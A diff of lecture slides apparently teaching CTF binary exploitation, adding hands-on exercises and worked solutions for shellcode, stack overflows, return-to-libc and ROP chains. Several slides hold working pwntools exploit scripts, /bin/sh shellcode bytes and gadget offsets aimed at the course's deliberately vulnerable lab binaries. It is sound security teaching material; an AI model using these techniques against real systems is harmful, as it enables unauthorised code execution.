@@ -53,6 +53,12 @@ style: |
     div.twocolumn {
         column-count: 2;
     }
+    div, pre, li {
+        break-inside: avoid;
+    }
+    img {
+        background-color: transparent;
+    }
     strong {
         color: red;
         font-style: normal;
@@ -209,19 +215,13 @@ int main() {
 }
 ```
 
-```
+```console
 $ echo 31c0ffc0c3 | xxd -r -p | ./program
 1
-
 $ echo 31c0ffc0ffc0c3 | xxd -r -p | ./program
 2
-
 $ echo 31c0ffc0ffc0ffc0c3 | xxd -r -p | ./program
 3
-
-
-
-
 ```
 
 </div>
@@ -229,7 +229,7 @@ $ echo 31c0ffc0ffc0ffc0c3 | xxd -r -p | ./program
 ---
 <!-- _class: handson -->
 
-## :memo: hands-on (1): simple code generation
+## :memo: hands-on (1): simple code generation (x86-**64**) (`chal1`)
 
 <div class=twocolumn>
 
@@ -253,8 +253,6 @@ Hint:
   `echo -ne "\x89\xc3" | ./chal1` or `echo 89c3 | xxd -r -p | ./chal1`
   to input binary data to the program
 
-<br>
-<br>
 </div>
 
 ---
@@ -287,7 +285,7 @@ void binsh() {
 }
 ```
 
-```asm
+```x86asm
   movabs  rax, 0x68732f6e69622f
   mov     qword ptr [rsp], rax
   mov     rdi, rsp
@@ -317,14 +315,9 @@ void binsh() {
     // execve(cmd, cmds, NULL);
     syscall(0x3b, cmd, cmds, NULL);
 }
-
-
-
-
-
 ```
 
-```asm
+```x86asm
   movabs  rax, 29400045130965551
   sub     rsp, 40
   xor     edx, edx
@@ -349,7 +342,7 @@ Let's assemble the above shellcode and input to the program:
 
 ```
 $ echo 48b82f62696e2f7368004883ec2831d2488d7c2408488d742410488944240848 \
-c74424180000000048897c2410b83b0000000f054883c428c3 | xxd -r -p | ./chal1-64
+c74424180000000048897c2410b83b0000000f054883c428c3 | xxd -r -p | ./chal1
 $
 ```
 
@@ -361,9 +354,10 @@ What should we do? Let's use pwntools for input/output interaction!
 ---
 <!-- _class: handson -->
 
-## :memo: hands-on (2): shellcode execution
+## :memo: hands-on (2): shellcode execution (x86-**64**) (`chal1`)
 
-Write a script with `pwntools` to execute shellcode
+This challenge shares `chal1` binary.
+Write a script with `pwntools` to execute shellcode in `chal1` program.
 
 ```python
 from pwn import *
@@ -400,7 +394,7 @@ void f() {
 
 <img height=350 src="./figures/fig3.svg">
 <!--
-```
+```text
 DATA   +-------------------------+ read() 1st
  buf1  | shellcode (256 bytes)   |   |  <--------+
        |                         |   V           |
@@ -424,7 +418,7 @@ STACK  +-------------------------+ read() 2nd    |
 ---
 <!-- _class: handson -->
 
-## :memo: hands-on (3): stack overflow & shellcode
+## :memo: hands-on (3): stack overflow & shellcode (x86-**64**) (`chal3`)
 
 Let's write script using `pwntools` to 
 
@@ -446,7 +440,7 @@ void f() {
 Hint:
 1. Understand at the stack layout depicted in the previous page.
 2. What is the address of `buf1`?
-3. Where is the offset of return address in the second `read()`?
+3. Where is the offset of return address from `buf2` in the second `read()`?
 
 </div>
 
@@ -455,23 +449,30 @@ Hint:
 
 ## :memo: hands-on (3): stack overflow & shellcode - solution (partial)
 
+<div style="font-size: 0.8em">
+
 ```python
 from pwn import *
 
 shellcode = ... # put shellcode here (max 256 bytes)
 buf1_addr = ... # put address of buf1 here
+retaddr_offset = 72 # offset of return address from buf2
+
+shellcode += b'\xcc' * (256 - len(shellcode)) # pad to 256 bytes
 
 p = process('./chal3')
 
 # this value is put into buf1
-p.send(shellcode.ljust(256, b'\xcc')) # send after padding
+p.send(shellcode)
 print(p.recv())
 
 # this value is put into buf2
-p.send(b'A' * 72 + p64(buf1_addr))    # overwrite return address
+p.send(b'A' * retaddr_offset + p64(buf1_addr))  # overwrite return address
 
 p.interactive()
 ```
+
+</div>
 
 ---
 
@@ -587,7 +588,7 @@ Return to libc
 ---
 <!-- _class: handson -->
 
-## :memo: hands-on (4): return to libc (x86-**32**)
+## :memo: hands-on (4): return to libc (x86-**32**) (`chal4`)
 
 Let's run `system("/bin/sh")`!
 
@@ -656,13 +657,13 @@ Solution: **Return Oriented Programming** (**ROP**)
 
 ---
 
-## Code reuse attack - ROP: chaining calls
+## Code reuse attack - ROP (x86-**32**): chaining calls
 
 example for `gets(str); printf("name=%s", str);` in x86-**32**
 
 <img width=1200 src="./figures/fig6.svg">
 <!--
-```
+```text
                                                            expected payload (merged)
          +--------------+                                   +--------------+
          | buffer       |                                   | AAAA ...     |
@@ -686,14 +687,14 @@ Note: this only works if the first function is unary, and at most two functions 
 
 ---
 
-## Code reuse attack - ROP: discard stack
+## Code reuse attack - ROP (x86-**32**): discard stack
 
-If we need to chain calls more than twice, we need to adjust stack pointer by discarding some stack elements by discarding gadget
+If we need to chain calls more than twice, we need to adjust stack pointer by discarding some stack elements by discarding gadget (e.g. `pop ebp; ret`)
 `func1(argA, argB); func2(argC, argD); func3(argE);`
 
 <img width=800 src="./figures/fig7.svg">
 <!--
-```
+```text
    vuln() executed             discard2 -> /-------------\
      +--------------+                      | pop eax     |
      | buffer       |                      | pop ebx     |
@@ -732,29 +733,27 @@ If we need to chain calls more than twice, we need to adjust stack pointer by di
 How can we find "discard" gadget (e.g., `pop eax; pop ebx; ret`)?
 
 - [ROPgadget](http://shell-storm.org/project/ROPgadget/) program
-  ```
-  $ ROPgadget ./binaryprogram
+  ```console
+  $ pip install ROPGadget
+  $ ROPgadget --binary ./binaryprogram
+  ...
+  0x0804856a : pop ebp ; ret
+  0x08048567 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+  0x0804833d : pop ebx ; ret
+  ...
   ```
 - pwntools (described later)
 
 ---
 <!-- _class: handson -->
 
-## :memo: hands-on (5): ROP (x86-**32**) - discard stack
+## :memo: hands-on (5): ROP (x86-**32**) - discard stack (`chal5`)
 
 Create `flag.txt` with arbitrary content. Dump the content of `flag.txt` by calling `read_file` / `print_data` with appropriate parameters using a ROP chain.
 
-<div style="font-size: 0.9em">
-
-<div class=twocolumn>
-
-
-<div style="font-size: 0.7em">
+<div class=twocolumn style="font-size: 0.75em">
 
 ```c
-code_t discard_gadget
-  = "\x58\x58\x58\x58\x58\x58\x58\xc3";
-// pop eax; ...; pop eax; ret
 char buf[1024];
 void read_file(const char *filename,
                char *buf, int size) {
@@ -771,14 +770,17 @@ void vuln() {
   memcpy(stkbuf, buf, 1024);
 }
 ```
-</div>
+
+<div>
 
 Hint:
 1. Write a normal program using only the two functions to dump `flag.txt`.
 2. Convert each call into ROP form.
 3. Find discard gadgets.
 4. Adjust stack after call by discard gadget.
-5. Put everything into a single ROP chain.
+5. Identify the offset of return address from `stkbuf`.
+6. Consider buffer layout to put constant string `"flag.txt"` and file data.
+7. Put everything together into a script.
 
 </div>
 </div>
@@ -788,12 +790,473 @@ Hint:
 
 ## :memo: hands-on (5): ROP (x86-**32**) - discard stack: partial solution
 
+<div class=twocolumn style="zoom: 0.7">
+
 1. Normal program to dump `flag.txt`
    ```c
    read_file("flag.txt", buf, 1024);
    print_data(buf);
    ```
-2. 
+2. Convert each call into ROP form
+   <img src="./figures/fig8.svg">
+   <!--
+   ```
+   +---------------+            +---------------+
+   | -> read_file  | function   | print_data    |
+   +---------------+            +---------------+
+   | (next return) |            | (next return) |
+   +---------------+            +---------------+
+   | -> "flag.txt" | arg1       | -> buf        |
+   +---------------+            +---------------+
+   | -> buf        | arg2
+   +---------------+
+   | 1024          | arg3
+   +---------------+
+   ```
+   -->
+3. Find discard gadgets
+   ```console
+   $ ROPgadget --binary ./chal5
+   ...
+   0x0804833d : pop ebx ; ret
+   0x08048569 : pop edi ; pop ebp ; ret
+   0x08048568 : pop esi ; pop edi ; pop ebp ; ret
+   ...
+   Unique gadgets found: 149
+   ```
+4. Adjust stack after call by discard gadget.
+   <img src="./figures/fig9.svg">
+   <!--
+   ```text
+   +---------------+
+   | -> read_file  | call read_file
+   +---------------+
+   | -> discard3   | discard 3 stack elements and jump to next function
+   +---------------+
+   | -> "flag.txt" |     (read_file arg1)     discard3 -> +----------+
+   +---------------+                                      | pop esi  |
+   | -> buf        |     (read_file arg2)                 | pop edi  |
+   +---------------+                                      | pop ebp  |
+   | 1024          |     (read_file arg3)                 | ret      |
+   +---------------+                                      +----------+
+   | -> print_data | call print_data
+   +---------------+
+   | (next return) | next instruction to be executed after this ROP chain
+   +---------------+
+   | -> buf        |     (print_data arg1)
+   +---------------+
+   ```
+   -->
+5. Identify the offset of return address from `stkbuf`:
+   Using a debugger, we can find that the return address (in `main`) is located at 92 bytes offset from the `stkbuf` start.
+
+</div>
+
+---
+<!-- _class: handson -->
+
+## :memo: hands-on (5): ROP (x86-**32**) - discard stack: partial solution
+
+<div class=twocolumn style="zoom: 0.7">
+
+6. Consider buffer layout to put constant string `"flag.txt"` and file data.
+   `buf` can be used to store both a constant string `"flag.txt"` and file data. The ROP chain itself can be stored at the offset 92 of the buffer (inspect the offset by using debugger)
+   <img src="./figures/fig10.svg">
+   <!--
+   ```text
+     +0 +-------------------------+ <- buf  ----- +0
+        | "flag"                  | <-----+   ^
+        | ".txt"                  |       |   |
+     +8 +-------------------------+       |   |
+        | "\0"                    |       |   | stkbuf[64]
+    +12 +-------------------------+       |   |
+        :                         :       |   |
+        :                         :       |   v
+    +64 +-------------------------+       | ----- +64
+        :                         :       |   ^
+        :                         :       |   |
+    +92 +-------------------------+       |   |
+        | -> read_file            |       |   | overflowen
+    +96 +-------------------------+       |   | onto stack
+        | -> discard3 gadget      |       |   | when copied
+   +100 +-------------------------+       |   |
+        | -> "flag.txt" (buf)     | ------+   |
+   +104 +-------------------------+           |
+        : (the rest of ROP chain) :           v
+        +-------------------------+         ----- +1024
+   ```
+   -->
+7. Write a script
+   ```python
+   from pwn import *
+
+   retaddr_offset = 92
+   rop_chain = b'flag.txt'
+   rop_chain += b'\x00' * (retaddr_offset - len(rop_chain))
+   rop_chain += p32(0x80484d6) # read_file
+   rop_chain += p32(0x8048568) # gadget: discard 3 stack
+   rop_chain += p32(0x804a060) #   arg1: "flag.txt" == buf
+   rop_chain += p32(0x804a060) #   arg2: buf
+   rop_chain += p32(1024)      #   arg3: 1024 (len)
+   rop_chain += p32(0x8048517) # print_data
+   rop_chain += p32(0)         # dummy (next return)
+   rop_chain += p32(0x804a060) #   arg1: buf
+
+   p = process('./chal5')
+   p.send(rop_chain)
+   p.interactive()
+   ```
+
+</div>
+
+---
+
+## Code reuse attack - ROP: set register
+
+<div class=twocolumn style="font-size: 0.8em">
+
+- In **64bit** x86 architecture, we have another problem:
+    - calling convension - the arguments (up to 6) are not passed through stack but through registers
+      args: `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`, (stack)
+- Solution: set register gadget
+    - `pop rdi; ret`: set 1st argument (`rdi`)
+    - `pop rsi; ret`: set 2nd argument (`rsi`)
+- ROP chain for `func(arg1, arg2);`
+  <img src="./figures/fig11.svg">
+  <!--
+  ```text
+  +-------------------+
+  | -> set rdi gadget |  -> pop rdi; ret
+  +-------------------+
+  | arg1              |  (stored in rdi)
+  +-------------------+
+  | -> set rsi gadget |  -> pop rsi; ret
+  +-------------------+
+  | arg2              |  (stored in rsi)
+  +-------------------+
+  | -> func           |  call func after setting args
+  +-------------------+
+  ```
+  -->
+
+</div>
+
+---
+
+## Code reuse attack - ROP: set register
+
+<div class=twocolumn style="font-size: 0.8em">
+
+- "set register" gadget may not present in the simplest form
+    - for example `pop rsi; ret` may not be present in the binary
+- In that case, look for alternative gadgets which can update the register
+    - It is fine if other registers are popped at the same time:
+      `pop rsi; pop r15; ret`
+      in this case `r15` is not used by the callee function, so can be overwritten (clobbered) safely
+- ROP chain for `func(arg1, arg2);`
+  where `pop rsi; ret` gadget is not available
+  and `pop rsi; pop r15; ret` gadget is used
+  <img src="./figures/fig12.svg">
+  <!--
+  ```text
+  +-----------------------+
+  | -> set rdi gadget     |  -> pop rdi; ret
+  +-----------------------+
+  | arg1                  |  (stored in rdi)
+  +-----------------------+
+  | -> alternative gadget |  -> pop rsi; pop r15; ret
+  +-----------------------+
+  | arg2                  |  (stored in rsi)
+  +-----------------------+
+  | (dummy)               |  (stored in r15)
+  +-----------------------+
+  | -> func               |  call func after setting args
+  +-----------------------+
+  ```
+  -->
+
+</div>
+
+---
+<!-- _class: handson -->
+
+## :memo: hands-on (6): ROP (x86-**64**) - set register (`chal6`)
+
+Create `flag.txt` with arbitrary content. Dump the content of `flag.txt` by
+(1) generating a command string `cat flag.txt` by calling `make_cat_command` and
+(2) running the command string by calling `run_shell`.
+
+<div class=twocolumn style="font-size: 0.75em">
+
+```c
+char buf[1024];
+char flag_filename[] = "flag.txt";
+
+void make_cat_command(char *command, char *filename) {
+  sprintf(command, "cat %s", filename);
+}
+void run_shell(char *command) {
+  system(command);
+}
+void vuln() {
+  char stkbuf[64];
+  read(0, stkbuf, 1024);
+}
+```
+
+<div>
+
+Hint:
+1. Write a normal program using the functions.
+2. Find register setting gadgets for `rdi` and `rsi`.
+3. Convert each call into ROP form, using the gadgets.
+4. Combine the calls to generate a ROP chain.
+5. Identify the offset of return address from `stkbuf`.
+6. Write a script to generate the payload.
+
+</div>
+</div>
+
+---
+<!-- _class: handson -->
+
+## :memo: hands-on (6): ROP (x86-**64**) - set register: partial solution
+
+<div class=twocolumn style="font-size: 0.8em">
+
+1. Write a normal program using the functions
+   ```c
+   make_cat_command(buf, flag_filename);
+   run_shell(buf);
+   ```
+2. Find register setting gadgets for `rsi` and `rdi`
+   ```console
+   $ ROPgadget --binary ./chal6
+   ...
+   0x0000000000400663 : pop rdi ; ret
+   0x0000000000400661 : pop rsi ; pop r15 ; ret
+   ```
+3. Convert each call into ROP form
+   ```text
+   +---------------------+                               +---------------------+
+   | -> set rdi gadget   |  -> pop rdi; ret              | -> set rdi gadget   |  -> pop rdi; ret
+   +---------------------+                               +---------------------+
+   | buf                 |  set arg1                     | buf                 |  set arg1
+   +---------------------+                               +---------------------+
+   | -> set rsi gadget   |  -> pop rsi; pop r15; ret     | -> run_shell        |  call func
+   +---------------------+                               +---------------------+
+   | flag_filename       |  set arg2
+   +---------------------+                    0x400661 -> /---------\  0x400663 -> /---------\
+   | (dummy)             |  (stored in r15)               | pop rsi |              | pop rdi |
+   +---------------------+                                | pop r15 |              | ret     |
+   | -> make_cat_command |  call func                     | ret     |              \---------/
+   +---------------------+                                \---------/
+   ```
+4. Combine the calls to generate a ROP chain.
+   ```text
+   +---------------------+
+   | -> set rdi gadget   |
+   +---------------------+
+   | buf                 |
+   +---------------------+
+   | -> set rsi gadget   |
+   +---------------------+
+   | flag_filename       |
+   +---------------------+
+   | (dummy)             |
+   +---------------------+
+   | -> make_cat_command |
+   +---------------------+
+   | -> set rdi gadget   |
+   +---------------------+
+   | buf                 |
+   +---------------------+
+   | -> run_shell        |
+   +---------------------+
+   ```
+
+</div>
+
+---
+<!-- _class: handson -->
+
+## :memo: hands-on (6): ROP (x86-**64**) - set register: partial solution
+
+<div class=twocolumn style="font-size: 0.6em">
+
+5. Identify the offset of return address from `stkbuf`.
+   ```text
+   $ gdb ./chal6
+   (gdb) disas vuln
+      ...
+      0x00000000004005be <+31>:    leaveq
+      0x00000000004005bf <+32>:    retq
+   (gdb) break *0x4005bf
+   (gdb) run
+   AAAAAAAA
+   Breakpoint 1, 0x00000000004005bf in vuln ()
+   (gdb) bt
+   #0  0x00000000004005bf in vuln ()
+   #1  0x00000000004005ce in main ()
+   (gdb) x/32xw $rsp-0x60
+   0x7fffffffdf28: 0xf7ffe190      0x00007fff      0x00000001      0x00000000
+   0x7fffffffdf38: 0x004005bd      0x00000000      0x41414141      0x41414141
+   0x7fffffffdf48: 0xffffdf0a      0x00007fff      0x00000001      0x00000000
+   0x7fffffffdf58: 0x0040062d      0x00000000      0xf7fbbfc8      0x00007fff
+   0x7fffffffdf68: 0x004005e0      0x00000000      0x00000000      0x00000000
+   0x7fffffffdf78: 0x00400470      0x00000000      0xffffdf90      0x00007fff
+   0x7fffffffdf88: 0x004005ce      0x00000000      0x00000000      0x00000000
+   0x7fffffffdf98: 0xf7df20b3      0x00007fff      0xf7ffc620      0x00007fff
+   ```
+   In this layout, return address `0x4005ce` is located at a=`0x7fffffffdf88` and the buffer (stores user input `0x41414141`) starts at b=`0x7fffffffdf40`, thus the offset is a-b = 0x48 = 72 bytes.
+6. Write a script to generate the payload.
+   ```python
+   from pwn import *
+
+   retaddr_offset = 72
+   rop_chain = b'A' * retaddr_offset
+
+   # call make_cat_command(buf, flag_filename);
+   rop_chain += p64(0x400663) # set rdi gadget
+   rop_chain += p64(0x601080) #    rdi = arg1: buf
+   rop_chain += p64(0x400661) # set rsi/r15 gadget
+   rop_chain += p64(0x601040) #    rsi = arg2: "flag.txt"
+   rop_chain += p64(0)        #    r15 = dummy
+   rop_chain += p64(0x400557) # call make_cat_command
+
+   # call run_shell(buf);
+   rop_chain += p64(0x400663) # set rdi gadget
+   rop_chain += p64(0x601080) #    rdi = arg1: buf
+   rop_chain += p64(0x400584) # call run_shell
+
+   p = process('./chal6')
+   p.send(rop_chain)
+   p.interactive()
+   ```
+</div>
+
+---
+
+## Code reuse attack - ROP: do it easier with pwntools
+
+- Writing a ROP chain is a tedious task
+    - In 32bit environment: consider stack adjustment after call
+    - In 64bit environment: consider setting argument registers
+- Can this be automated?
+    - Answer: yes, using pwntools module [ROP](http://docs.pwntools.com/en/stable/rop/rop.html)
+
+---
+
+## Code reuse attack - ROP: do it easier with pwntools (x86-**32**)
+
+Automate 32bit ROP chains
+
+<div class=twocolumn>
+
+- Writing manually
+  ```python
+  from pwn import *
+
+  chain = b'A' * 72
+  # build chain for func1(buf, 12345)
+  chain += p32(0x400100) # func1
+  chain += p32(0x400567) # gadget: discard 2
+  chain += p32(0x600500) # param1 (buf)
+  chain += p32(12345)    # param2 (12345)
+  # build chain for func2(buf, 67890)
+  chain += p32(0x400200) # func2
+  chain += p32(0)        # dummy
+  chain += p32(0x600500) # param1 (buf)
+  chain += p32(67890)    # param2 (67890)
+
+  p = process('./binary')
+  p.send(chain)
+  ```
+- Writing using `ROP` module
+  ```python
+  from pwn import *
+  context.arch = 'i386'
+  e = ELF('./binary')
+  r = ROP(e)
+
+  # build chain for func1(buf, 12345)
+  r.call('func1', [e.symbols['buf'], 12345])
+
+  # build chain for func2(buf, 67890)
+  r.func2(e.symbols['buf'], 67890)
+
+  print(r.dump()) # debug dump
+
+  p = process('./binary')
+  p.send(b'A'*72 + r.chain())
+  ```
+  Much easier to understand!
+
+</div>
+
+---
+
+## Code reuse attack - ROP: do it easier with pwntools (x86-**64**)
+
+Automate 64bit ROP chains
+
+<div class=twocolumn style="font-size: 0.7em">
+
+- Writing manually
+  ```python
+  from pwn import *
+
+  chain = b'A' * 72
+  # build chain for func1(buf, 12345)
+  chain += p64(0x400678) # gadget: pop rdi
+  chain += p64(0x600500) # param1 (buf)
+  chain += p64(0x400987) # gadget: pop rsi
+  chain += p64(12345)    # param2 (12345)
+  chain += p64(0x400100) # func1
+  # build chain for func2(buf, 67890)
+  chain += p64(0x400678) # gadget: pop rdi
+  chain += p64(0x600500) # param1 (buf)
+  chain += p64(0x400987) # gadget: pop rsi
+  chain += p64(67890)    # param2 (12345)
+  chain += p64(0x400200) # func2
+
+  p = process('./binary')
+  p.send(chain)
+  ```
+- Writing using `ROP` module
+  ```python
+  from pwn import *
+  context.arch = 'amd64'
+  e = ELF('./binary')
+  r = ROP(e)
+
+  # build chain for func1(buf, 12345)
+  r.call('func1', [e.symbols['buf'], 12345])
+
+  # build chain for func2(buf, 67890)
+  r.func2(e.symbols['buf'], 67890)
+
+  print(r.dump()) # debug dump
+
+  p = process('./binary')
+  p.send(b'A'*72 + r.chain())
+  ```
+  Much easier to understand!
+
+</div>
+
+---
+<!-- _class: handson -->
+
+## :memo: hands-on (7): ROP - using pwntools
+
+- Use pwntools ROP module to solve `chal5` (x86-**32**).
+- Use pwntools ROP module to solve `chal6` (x86-**64**).
+
+Takeaway
+- ROP module will hide troublesome works (gadget finding, ROP chain building) behind simple APIs (`ROP.call(name, [args ...])`)
+- It will also help simplicity and understandability of scripts (writeups)
+- However, harder challenges may require us to write complex ROP chains manually, so it is important to understand the mechanism of ROP
 
 ---
 
@@ -853,6 +1316,96 @@ Hint:
 - add a new user to the system
 
 http://shell-storm.org/shellcode/
+
+---
+
+## ROP advanced - indirect jump instead of return
+
+- ROP gadgets always ends with a return instruction (`ret`), which jumps to the address saved on the stack top
+- However, we can use indirect jumps/calls (e.g., `jmp eax` or `call eax`) to jump to arbitrary code location, if `eax` is controllable
+- It is called **Jump oriented programming** (**JOP**)
+- If ROP gadget is not available, JOP gadget might be used instead
+- example
+    - `pop edi ; jmp eax`
+    - `mov edi, dword ptr [esi] ; jmp ebx`
+
+---
+
+## Solving pwn challenges in CTF
+
+- Now we have learned about:
+    - stack-based buffer overflow
+    - shellcode
+    - return-oriented programming (ROP)
+- When can we use these techniques?
+    - It depends on **protection measures** used in the challenge
+- How we can know about protection measures in the binary?
+    - Use `pwn checksec`
+
+---
+
+## Solving pwn challenges - understanding protection measures
+
+If you have `pwntools` installed, you have `pwn` command
+
+<div class=twocolumn>
+
+```console
+$ pwn checksec chal1
+[*] '/path/to/chal1'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+```
+
+<div>
+
+Protection related to exploitability:
+- Stack: if canary found, it may be hard to use stack-based buffer overflow
+- NX: if enabled, we cannot use shellcode
+- PIE: if enabled, code address is randomized and ROP is more difficult
+
+</div>
+
+</div>
+
+---
+
+## Solving pwn challenges - understanding protection measures
+
+Example strategy for solving exploitation challenge
+(considering only stack-based buffer overflow)
+
+1. Run `pwn checksec`
+2. If it has stack canary, then stack-based overflow (overwriting return address) may not work; otherwise, proceed to 3.
+3. If NX is disabled (or it has RWX segments), then shellcode may be used; otherwise, proceed to 4.
+4. If PIE is disabled, then ROP may be used; otherwise, consider leaking address or more advanced techniques.
+
+---
+<!-- _class: handson -->
+
+## :memo: hands-on (8): understanding protection measures
+
+- Use `pwn checksec` to see protection measures for each binary (`chal1` .. `chal6`).
+- Discuss what methods can be used to exploit the binary, based on `checksec` result.
+- Try to use shellcode for NX-bit enabled binary and see what happens.
+
+Takeaway
+- It is important to identify binary type and protection measures first, to determine strategy. If an inappropriate exploitation technique is used, exploit will be unsuccessful.
+- Protection measures contributes to block exploitation to some extent. It is important to adopt several protection measures for resilience to several attacks.
+
+---
+
+## What we learned in this session
+
+- Shellcode basics
+- ROP (return oriented programming) basics
+- Using pwntools to simplify shellcode / ROP building
+- Some advanced topics about shellcode and ROP
+- Inspection of protection measures to decide an exploitation strategy
 
 ---
 <!-- _class: invert -->
